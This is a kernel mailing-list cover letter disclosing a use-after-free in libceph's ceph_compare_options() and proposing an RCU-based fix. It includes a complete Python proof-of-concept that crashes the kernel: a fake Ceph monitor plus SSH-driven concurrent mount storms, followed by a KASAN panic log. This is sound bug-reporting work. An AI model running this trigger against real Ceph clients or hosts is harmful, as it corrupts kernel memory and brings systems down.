Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A435426ADC
	for <ceph-devel@vger.kernel.org>; Wed,  8 Jul 2026 03:03:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1783479835; cv=none; b=eU4MhAHSyd7T8ECmOGIR81RJnzcoyDTw7kK7nlx6Og+dTEx2v+f8JvPV6cNeqQjurFI/7M7ZZEtnEVxOdD1lSOFG10P8zCGiAX1n/bXWAeEoGm+Q2yPo1dZ8Nn5b6Bsp22mUa0STB5hLQiXmZD07My1M5/HV2D13pJn7SgkMFGY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1783479835; c=relaxed/simple;
	bh=tg/9ayt8dNQHHx0QzLlCeb+BIluJKHoo0CWJ8hYB13A=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GQBVR92DjZL1mQciUJMKuzZKRhJHEClVfZ3rLDnQpKX91tDUPhWJbEXxwb00IPqOZAv8wtflVQVB9VUiqRMCX0EgGt43kSdROb3W3Fg2emFEztnoMmyeZEqPAUvct4LqHBjuOnCUdsD3FRpn99RMahxngOYbsZ/U8LayR5gDfnk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=eq6+jGj1; arc=none smtp.client-ip=209.85.210.182
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="eq6+jGj1"
Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-84794e800f4so114960b3a.0
        for <ceph-devel@vger.kernel.org>; Tue, 07 Jul 2026 20:03:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1783479833; x=1784084633; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=qGlbH/1W30ijTXCz61IVnEDsVyLcmlTLzyLWvLDxVw4=;
        b=eq6+jGj1TUURbhlgNfvq1Az3TGikdXH1G5ntJ37+tKpSkLqgRPfwYuO7OLWWG+ixdi
         IEND7XuwZtxd29pA910zK5Li+Ro8icr6v6mkDtrLU304ShVw2fsZ7OLUX9m4Is2aCnzG
         Lmpcwe1X8KUmceBaqi/JWeYDazuM09lbSfailHZn2XlouLzvwQhoC1fzY2MHGel4HRA9
         ndTEcKI2T+nHiutXdAqsRELZgIOHYZEmDL9+fQrMMIyWTv+rbk8q7vTZN15A1jfMclyq
         6xccAC5a/1gItEBnW0JLLWuYVO0iy3burkL5MYqRd7NHKCjx5yyOALpXHIoU0pl0Yeay
         fleA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1783479833; x=1784084633;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=qGlbH/1W30ijTXCz61IVnEDsVyLcmlTLzyLWvLDxVw4=;
        b=k0VbRDaRIFOI/1pBmFPRtq02HNN9e+xGlBoZLaGerIhAgvJYpSkR9/0rGrewXc9hov
         AJ+L4CTel51gyzU8W1VgojWfHeqyF8hD7ggpbAv/eHamj3vOiw8DdmJktDa//ryxWQbO
         KwPONblIg5ZUo53u7VcZfxP1zbd+2xcsLgA70QoFwdYnnMhgfnMaNgGsmby6N8WujOHm
         NUDPCcAyINONHI24Vgn6JooEw3nT8W7BhLjQlLFERYpe3ewNFCIdOl1QCQBbrxQGQk+H
         KDLdeEaTHVZIpKhxKrCXtpinIEBMuaAKO0Uy64vy+2uZWM+CdovyVwpFrbYFvCCLnI0w
         kKPg==
X-Gm-Message-State: AOJu0YzMOck5AAp/PYuAtGi99gjdbcrZtoqTRqb3XG7ALJqaxjMr6tZs
	4LojXCn/5u4FyBWESdFxiUeNLyln22X3AxmmNu9W6IE3XnKe/T0eZZGWEpT1MViQ
X-Gm-Gg: AfdE7cm2UN/LPClTnRKL9BZdwugBvA2fDsbojNgGmt158hGyuvi4vyA0+f1iZjjge6R
	clF/nmekMAQskOH6TaU9kcLQcYTu4AUtToaDzKSpVvj9ltIPK53FTvk8wMX+Gquwe9/uxGgPUNe
	n/U3SaKdcCRjETliae/jg9+azc4DlNKhXvBvyy/uG4TJnXK/d4E8mIQZM777SdzVPL8FPS1oXwV
	79SCIfEU4P/DJroorvOhqD27HkfkruIdp5DFytpo/GsmLYMTEuO7zyQaQvsq8kP90L0mdX9wJV4
	PUo2FOFsAS3wU3IaZkFFcbeh41rlc2lvHzLweQIyNmUvDBl4noGqM2bmn/J0Wix2r+ONOLubJvm
	3PHGbq7qAiXGWNn51sIMAwOBxKfcBEZwXtLUfCzkt1l+cOqPmq5sQ0igNuon6X/ERzFTHnhjjFr
	R8dYlfMMOnW29uRJA7sswmtPoYpeWn2zo=
X-Received: by 2002:a05:6a00:4c88:b0:848:2f74:d8d4 with SMTP id d2e1a72fcca58-8484300062emr721184b3a.69.1783479832873;
        Tue, 07 Jul 2026 20:03:52 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([123.114.53.210])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-847f6b609acsm6175745b3a.1.2026.07.07.20.03.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 07 Jul 2026 20:03:52 -0700 (PDT)
From: Ren Wei <enjou1224z@gmail.com>
To: ceph-devel@vger.kernel.org
Cc: yuantan098@gmail.com,
	dstsmallbird@foxmail.com,
	edragain@163.com,
	enjou1224z@gmail.com
Subject: [PATCH 0/1] libceph: fix a monmap use-after-free in ceph_compare_options()
Date: Wed,  8 Jul 2026 11:03:40 +0800
Message-ID: <cover.1783423648.git.edragain@163.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Yong Wang <edragain@163.com>

Hi Linux kernel maintainers,

We found and validated a use-after-free in net/ceph/ceph_common.c.
The bug is reachable by root via the normal CephFS mount path.
We tested the fix and it does not change the existing non-blocking
mount-share comparison semantics.

We provide the technical details, the reproducer that triggers the bug
and the crash log below.

---- details below ----

Bug details:

ceph_compare_options() determines whether a new mount can share an
existing client by checking whether any monitor address in the new
mount options is present in client->monc.monmap:

	for (i = 0; i < opt1->num_mon; i++) {
		if (ceph_monmap_contains(client->monc.monmap,
					 &opt1->mon_addr[i]))
			return 0;
	}

That path runs from ceph_compare_super() during shared mount lookup.
It can execute under sb_lock or rbd_client_list_lock, so it cannot
take monc->mutex.

Monitor map updates, however, replace monc->monmap under monc->mutex
and free the old map immediately:

	mutex_lock(&monc->mutex);
	...
	kfree(monc->monmap);
	monc->monmap = monmap;

ceph_monmap_contains() then walks m->num_mon and m->mon_inst[] on a
monmap object whose lifetime is not protected against concurrent
replacement.  A shared-mount comparison racing a monmap update can
therefore dereference a freed struct ceph_monmap and walk stale
mon_inst[] entries, leading to a slab-use-after-free.

The attached patch fixes this by protecting the compare path with RCU
and by publishing/freeing monitor maps with rcu_assign_pointer() and
kfree_rcu().

Reproducer:

We ran the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

exec python3 "poc.py" \
  --ssh-port "$QEMU_SSH_PORT" \
  --monitor-port "6789" \
  --workers "16" \
  --duration "5" \
  --attempts "10" \
  --update-interval "0.0005"

------BEGIN poc.py------
#!/usr/bin/env python3
import argparse
import os
import shlex
import socket
import struct
import subprocess
import sys
import threading
import time

POLY = 0x82F63B78
BANNER = b"ceph v027"
BANNER_ADDR = b"\x00" * 136
FSID = bytes.fromhex("11223344556677889900aabbccddeeff")

TAG_READY = 1
TAG_MSG = 7
TAG_ACK = 8
TAG_KEEPALIVE = 9
TAG_KEEPALIVE2 = 14
TAG_KEEPALIVE2_ACK = 15
TAG_CLOSE = 6

MSG_MON_MAP = 4
MSG_MON_SUBSCRIBE = 15
MSG_MON_SUBSCRIBE_ACK = 16
MSG_AUTH = 17
MSG_AUTH_REPLY = 18

NUM_MON = 31


def crc32c(data, seed=0):
    crc = seed & 0xFFFFFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ POLY
            else:
                crc >>= 1
            crc &= 0xFFFFFFFF
    return crc


def recv_exact(sock, length):
    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise EOFError("peer closed")
        data += chunk
    return data


def pack_header(seq, tid, msg_type, front_len):
    hdr = b""
    hdr += struct.pack("<Q", seq)
    hdr += struct.pack("<Q", tid)
    hdr += struct.pack("<H", msg_type)
    hdr += struct.pack("<H", 127)
    hdr += struct.pack("<H", 0)
    hdr += struct.pack("<I", front_len)
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<I", 0)
    hdr += struct.pack("<H", 0)
    hdr += struct.pack("<B", 1)
    hdr += struct.pack("<Q", 0)
    hdr += struct.pack("<H", 0)
    hdr += struct.pack("<H", 0)
    hdr += struct.pack("<I", crc32c(hdr))
    return hdr


def pack_msg(seq, tid, msg_type, front):
    hdr = pack_header(seq, tid, msg_type, len(front))
    footer = struct.pack("<IIIQb", crc32c(front), 0, 0, 0, 1)
    return bytes([TAG_MSG]) + hdr + front + footer


def parse_msg_header(hdr):
    return {
        "seq": struct.unpack_from("<Q", hdr, 0)[0],
        "tid": struct.unpack_from("<Q", hdr, 8)[0],
        "type": struct.unpack_from("<H", hdr, 16)[0],
        "front_len": struct.unpack_from("<I", hdr, 22)[0],
        "middle_len": struct.unpack_from("<I", hdr, 26)[0],
        "data_len": struct.unpack_from("<I", hdr, 30)[0],
    }


def enc_addr(ip, port):
    ip_bytes = socket.inet_aton(ip)
    sockaddr = struct.pack("<H", socket.AF_INET)
    sockaddr += struct.pack(">H", port)
    sockaddr += ip_bytes
    sockaddr += b"\x00" * 8

    addr_struct = b""
    addr_struct += struct.pack("<B", 1)
    addr_struct += struct.pack("<BBI", 1, 1, 12 + len(sockaddr))
    addr_struct += struct.pack("<I", 1)
    addr_struct += struct.pack("<I", 0)
    addr_struct += struct.pack("<I", len(sockaddr))
    addr_struct += sockaddr
    return addr_struct


def enc_monmap(epoch):
    body = FSID
    body += struct.pack("<I", epoch)
    body += struct.pack("<I", NUM_MON)

    for i in range(NUM_MON):
        name = f"m{i}".encode()
        body += struct.pack("<I", len(name))
        body += name
        body += enc_addr("10.0.2.123", 7000 + i)

    blob = struct.pack("<BBI", 5, 5, len(body)) + body
    return struct.pack("<I", len(blob)) + blob


class ConnWorker(threading.Thread):
    def __init__(self, conn, stop_event, update_interval):
        super().__init__(daemon=True)
        self.conn = conn
        self.stop_event = stop_event
        self.update_interval = update_interval
        self.seq = 0
        self.epoch = 0
        self.subscribed = False
        self.error = ""

    def send_msg(self, tid, msg_type, front):
        self.seq += 1
        self.conn.sendall(pack_msg(self.seq, tid, msg_type, front))

    def handle_handshake(self):
        _ = recv_exact(self.conn, 9 + 136)
        self.conn.sendall(BANNER + BANNER_ADDR + BANNER_ADDR)

        cmsg = recv_exact(self.conn, 33)
        features, _host_type, gseq, cseq, proto, _aproto, alen, _flags = struct.unpack(
            "<QIIIIIIb", cmsg
        )
        if alen:
            _ = recv_exact(self.conn, alen)

        reply = struct.pack("<BQIIIIb", TAG_READY, features, gseq, cseq + 1, proto, 0, 0)
        self.conn.sendall(reply)
        self.conn.settimeout(0.001)

    def handle_msg(self, hdr_info, front):
        if hdr_info["type"] == MSG_AUTH:
            auth_reply = struct.pack("<IIQI", 1, 0, 0x1234, 0) + struct.pack("<I", 0)
            self.send_msg(hdr_info["tid"], MSG_AUTH_REPLY, auth_reply)
            return

        if hdr_info["type"] == MSG_MON_SUBSCRIBE:
            self.subscribed = True
            self.send_msg(hdr_info["tid"], MSG_MON_SUBSCRIBE_ACK, struct.pack("<I", 30) + FSID)
            return

    def run(self):
        try:
            self.handle_handshake()
            next_update = time.time()

            while not self.stop_event.is_set():
                now = time.time()
                if self.subscribed and now >= next_update:
                    sent = 0
                    while now >= next_update and sent < 4:
                        self.epoch += 1
                        self.send_msg(0, MSG_MON_MAP, enc_monmap(self.epoch))
                        next_update += self.update_interval
                        sent += 1
                        now = time.time()

                try:
                    tag = self.conn.recv(1)
                except socket.timeout:
                    continue

                if not tag:
                    return

                tag = tag[0]
                if tag == TAG_KEEPALIVE2:
                    stamp = recv_exact(self.conn, 8)
                    self.conn.sendall(bytes([TAG_KEEPALIVE2_ACK]) + stamp)
                    continue
                if tag == TAG_KEEPALIVE:
                    continue
                if tag == TAG_ACK:
                    _ = recv_exact(self.conn, 8)
                    continue
                if tag == TAG_CLOSE:
                    return
                if tag != TAG_MSG:
                    continue

                hdr = recv_exact(self.conn, 53)
                hdr_info = parse_msg_header(hdr)
                front = recv_exact(self.conn, hdr_info["front_len"])
                if hdr_info["middle_len"]:
                    _ = recv_exact(self.conn, hdr_info["middle_len"])
                if hdr_info["data_len"]:
                    _ = recv_exact(self.conn, hdr_info["data_len"])
                _ = recv_exact(self.conn, 21)
                self.handle_msg(hdr_info, front)
        except Exception as exc:
            self.error = str(exc)
        finally:
            try:
                self.conn.close()
            except OSError:
                pass


class FakeMonitor:
    def __init__(self, port, update_interval):
        self.port = port
        self.update_interval = update_interval
        self.stop_event = threading.Event()
        self.server = None
        self.accept_thread = None
        self.workers = []
        self.accept_errors = []

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind(("0.0.0.0", self.port))
        self.server.listen(256)
        self.server.settimeout(0.2)

        self.accept_thread = threading.Thread(target=self.accept_loop, daemon=True)
        self.accept_thread.start()

    def accept_loop(self):
        while not self.stop_event.is_set():
            try:
                conn, _addr = self.server.accept()
            except socket.timeout:
                continue
            except OSError as exc:
                if not self.stop_event.is_set():
                    self.accept_errors.append(str(exc))
                return

            worker = ConnWorker(conn, self.stop_event, self.update_interval)
            self.workers.append(worker)
            worker.start()

    def stop(self):
        self.stop_event.set()
        if self.server is not None:
            try:
                self.server.close()
            except OSError:
                pass
        if self.accept_thread is not None:
            self.accept_thread.join(timeout=1)
        for worker in self.workers:
            worker.join(timeout=1)

    def stats(self):
        subscribed = sum(1 for w in self.workers if w.subscribed)
        max_epoch = max((w.epoch for w in self.workers), default=0)
        return {
            "connections": len(self.workers),
            "subscribed": subscribed,
            "max_epoch": max_epoch,
            "errors": [w.error for w in self.workers if w.error] + self.accept_errors,
        }


class Repro:
    def __init__(self, ssh_port, monitor_port, workers, duration, attempts, update_interval):
        self.ssh_port = ssh_port
        self.monitor_port = monitor_port
        self.workers = workers
        self.duration = duration
        self.attempts = attempts
        self.update_interval = update_interval
        script_dir = os.path.dirname(os.path.abspath(__file__))
        repo_root = os.path.abspath(os.path.join(script_dir, "..", "..", "..", ".."))
        ssh_key = os.environ.get(
            "QEMU_SSH_KEY",
            os.path.join(repo_root, "kernel-image", "bullseye.id_rsa"),
        )
        self.ssh = [
            "ssh",
            "-i",
            ssh_key,
            "-o",
            "StrictHostKeyChecking=no",
            "-o",
            "UserKnownHostsFile=/dev/null",
            "-o",
            "ConnectTimeout=5",
            "-p",
            str(self.ssh_port),
            "root@localhost",
        ]

    def ssh_run(self, cmd, timeout=30):
        return subprocess.run(
            self.ssh + [cmd],
            text=True,
            capture_output=True,
            timeout=timeout,
        )

    def ssh_popen(self, cmd):
        return subprocess.Popen(
            self.ssh + [cmd],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )

    def guest_reachable(self):
        try:
            result = self.ssh_run("true", timeout=8)
        except subprocess.TimeoutExpired:
            return False
        return result.returncode == 0

    def cleanup_guest(self):
        cmd = (
            "pkill -x mount >/dev/null 2>&1 || true; "
            "pkill -x timeout >/dev/null 2>&1 || true; "
            "umount -a -t ceph >/dev/null 2>&1 || true; "
            "rm -rf /mnt/cephcmp; mkdir -p /mnt/cephcmp; "
            "dmesg -c >/dev/null 2>&1 || true; "
            "sysctl -w kernel.panic_on_warn=1 >/dev/null 2>&1 || true"
        )
        return self.ssh_run(cmd, timeout=30)

    def mount_source(self):
        mon = f"10.0.2.2:{self.monitor_port}"
        return ",".join(mon for _ in range(NUM_MON)) + ":/"

    def mount_opts(self):
        return "name=admin,ms_mode=legacy,nocephx_sign_messages,mount_timeout=30"

    def storm_cmd(self):
        source = shlex.quote(self.mount_source())
        opts = shlex.quote(self.mount_opts())
        return (
            "set -eu; "
            "for i in $(seq 0 " + str(self.workers - 1) + "); do "
            "mkdir -p /mnt/cephcmp/$i; "
            "done; "
            "end=$(( $(date +%s) + " + str(self.duration) + " )); "
            "for i in $(seq 0 " + str(self.workers - 1) + "); do "
            "(while [ $(date +%s) -lt $end ]; do "
            "timeout --signal=TERM --kill-after=1 1 "
            f"mount -i -t ceph {source} /mnt/cephcmp/$i -o {opts} >/dev/null 2>&1 || true; "
            "umount -l /mnt/cephcmp/$i >/dev/null 2>&1 || true; "
            "done) & "
            "done; "
            "wait"
        )

    def collect_dmesg(self):
        try:
            result = self.ssh_run("dmesg | tail -n 400", timeout=20)
        except subprocess.TimeoutExpired as exc:
            return f"dmesg timeout: {exc}", False
        return result.stdout + result.stderr, result.returncode == 0

    def run_attempt(self, attempt):
        cleanup = self.cleanup_guest()
        if cleanup.returncode != 0:
            raise RuntimeError(f"guest cleanup failed:\n{cleanup.stdout}\n{cleanup.stderr}")

        monitor = FakeMonitor(self.monitor_port, self.update_interval)
        monitor.start()

        print(f"[*] attempt {attempt}: starting mount storm with {self.workers} workers", flush=True)
        storm = self.ssh_popen(self.storm_cmd())

        time.sleep(self.duration + 2)

        monitor.stop()

        try:
            storm.wait(timeout=10)
        except subprocess.TimeoutExpired:
            storm.kill()
            storm.wait(timeout=5)

        stats = monitor.stats()
        print(
            f"[*] attempt {attempt}: connections={stats['connections']} subscribed={stats['subscribed']} max_epoch={stats['max_epoch']}",
            flush=True,
        )
        for err in stats["errors"][:8]:
            print(f"[i] server error: {err}", flush=True)

        reachable = self.guest_reachable()
        dmesg, got_dmesg = self.collect_dmesg() if reachable else ("guest unreachable after run", False)

        hit = False
        if got_dmesg:
            print(dmesg, flush=True)
            log = dmesg.lower()
            hit = (
                "kasan: slab-use-after-free" in log
                or "kasan: use-after-free" in log
                or "ceph_compare_options" in log
                or "ceph_monmap_contains" in log
                or "kernel panic - not syncing" in log
            )
        elif not reachable and stats["subscribed"] > 0 and stats["max_epoch"] > 10:
            hit = True
            print("[+] guest became unreachable after repeated monmap churn", flush=True)

        self.cleanup_guest()
        return hit

    def run(self):
        for attempt in range(1, self.attempts + 1):
            if self.run_attempt(attempt):
                return 0
        return 1


def main():
    parser = argparse.ArgumentParser(description="Trigger ceph_compare_options UAF with a fake monitor")
    parser.add_argument("--ssh-port", type=int, required=True, help="QEMU SSH port")
    parser.add_argument("--monitor-port", type=int, default=6789, help="Host fake monitor port")
    parser.add_argument("--workers", type=int, default=16, help="Concurrent guest mount workers")
    parser.add_argument("--duration", type=int, default=5, help="Per-attempt runtime in seconds")
    parser.add_argument("--attempts", type=int, default=10, help="Number of attempts")
    parser.add_argument(
        "--update-interval",
        type=float,
        default=0.0005,
        help="Seconds between monmap updates per subscribed client",
    )
    args = parser.parse_args()

    repro = Repro(
        ssh_port=args.ssh_port,
        monitor_port=args.monitor_port,
        workers=args.workers,
        duration=args.duration,
        attempts=args.attempts,
        update_interval=args.update_interval,
    )
    return repro.run()


if __name__ == "__main__":
    sys.exit(main())

------END poc.py--------

----BEGIN crash log----

[  227.669089][ T9575] libceph: mon8 (1)10.0.2.2:6789 session established
[  227.953134][   T26] libceph: mon30 (1)10.0.2.2:6789 session established
[  227.978738][T10215] ==================================================================
[  227.979344][T10215] BUG: KASAN: slab-use-after-free in ceph_monmap_contains+0x1e4/0x220
[  227.980082][T10215] Read of size 4 at addr ffff888045132014 by task mount/10215
[  227.980588][T10215]
[  227.980818][T10215] CPU: 0 UID: 0 PID: 10215 Comm: mount Not tainted 6.12.74 #1
[  227.980859][T10215] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  227.980884][T10215] Call Trace:
[  227.980901][T10215]  <TASK>
[  227.980911][T10215]  dump_stack_lvl+0x10e/0x1f0
[  227.981009][T10215]  print_report+0xc6/0x620
[  227.981338][T10215]  kasan_report+0xd8/0x110
[  227.981423][T10215]  ceph_monmap_contains+0x1e4/0x220
[  227.981474][T10215]  ceph_compare_options+0x591/0x700
[  227.981589][T10215]  ceph_compare_super+0x487/0xba0
[  227.981699][T10215]  sget_fc+0x51e/0xc10
[  227.982181][T10215]  ceph_get_tree+0x6e7/0x1e20
[  227.982379][T10215]  path_mount+0x6cc/0x1fd0
[  227.982639][T10215]  __x64_sys_mount+0x294/0x320
[  227.982738][T10215]  do_syscall_64+0xc7/0x250
[  227.982811][T10215]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  227.983093][T10215]  </TASK>
[  228.003473][T10215] Allocated by task 9575:
[  228.005659][T10215]  mon_dispatch+0x1906/0x2630
[  228.006129][T10215]  ceph_con_process_message+0x208/0x640
[  228.007264][T10215]  ceph_con_workfn+0x95a/0x11e0
[  228.009862][T10215]
[  228.010065][T10215] Freed by task 9575:
[  228.012555][T10215]  mon_dispatch+0x1aa4/0x2630
[  228.013032][T10215]  ceph_con_process_message+0x208/0x640
[  228.014011][T10215]  ceph_con_workfn+0x95a/0x11e0
[  228.016401][T10215]
[  228.041334][T10215] Memory state around the buggy address:
[  228.043135][T10215] >ffff888045132000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[  228.045551][T10215] ==================================================================
[  228.046391][T10215] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  228.052925][T10215]  check_panic_on_warn+0xab/0xb0
[  228.054125][T10215]  ceph_monmap_contains+0x1e4/0x220
[  228.055063][T10215]  ceph_compare_options+0x591/0x700
[  228.055976][T10215]  ceph_compare_super+0x487/0xba0
[  228.056930][T10215]  sget_fc+0x51e/0xc10
[  228.058710][T10215]  ceph_get_tree+0x6e7/0x1e20
[  228.060624][T10215]  path_mount+0x6cc/0x1fd0
[  228.063231][T10215]  __x64_sys_mount+0x294/0x320
[  228.064118][T10215]  do_syscall_64+0xc7/0x250
[  228.064528][T10215]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  228.071561][T10215] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Yong Wang

Yong Wang (1):
  libceph: use RCU to protect monmap in ceph_compare_options()

 fs/ceph/super.c                 |  7 +++--
 include/linux/ceph/mon_client.h |  4 ++-
 net/ceph/ceph_common.c          | 21 ++++++++++----
 net/ceph/debugfs.c              | 11 ++++---
 net/ceph/mon_client.c           | 51 ++++++++++++++++++++++-----------
 5 files changed, 65 insertions(+), 29 deletions(-)

-- 
2.53.0

